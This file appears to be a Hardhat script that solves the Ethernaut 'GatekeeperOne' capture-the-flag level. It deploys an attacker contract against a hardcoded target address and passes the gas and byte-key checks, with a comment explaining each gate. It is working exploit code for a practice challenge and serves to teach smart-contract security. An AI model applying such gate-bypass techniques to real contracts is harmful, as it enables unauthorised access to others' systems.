import { ethers } from "hardhat";
import { deployContract } from "../../utils/deployContract";
import { abi } from "../../artifacts/contracts/13.GatekeeperOne/GatekeeperOne.sol/GatekeeperOne.json";
import { BigNumber, Contract } from "ethers";

import { displayResult } from "../../utils/displayResult";

const targetAddress = "0xf79a50d2e6Dc1Caae39955c7B8224dCB588530B1";

async function main() {
  const [attacker] = await ethers.getSigners();
  const target = new Contract(targetAddress, abi, attacker);
  const gpoAttack = await deployContract("GatekeeperOneAttacker", attacker, [
    target.address,
  ]);
  const beforeLastByte = parseInt(
    attacker.address[38] + attacker.address[39],
    16
  );
  const lastByte = parseInt(attacker.address[40] + attacker.address[41], 16);
  const tx = await gpoAttack.attack(
    [1, 0, 0, 0, 0, 0, beforeLastByte, lastByte],
    {
      gasLimit: "3000000",
    }
  );
  await tx.wait();

  const entrant = await target.entrant();
  displayResult(BigNumber.from(attacker.address).eq(entrant));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

/* Explanation of the attack:
  gateOne: do the attack though a smartcontract.
  gateTwo: do the attack using the low level code call() and specify the amount
  of gas you want to provide. Make sure to send enough. Use console.log(gasleft())
  and be careful of the solidity version !!
  gateThree:
    require 1: make sure that bytes 4 and 5 are 0
    require 2: make sure either bytes 0, 1, 2 or 3 are != 0
    require 3: just take the 2 last bytes of the address and put them at the end of the key.
*/
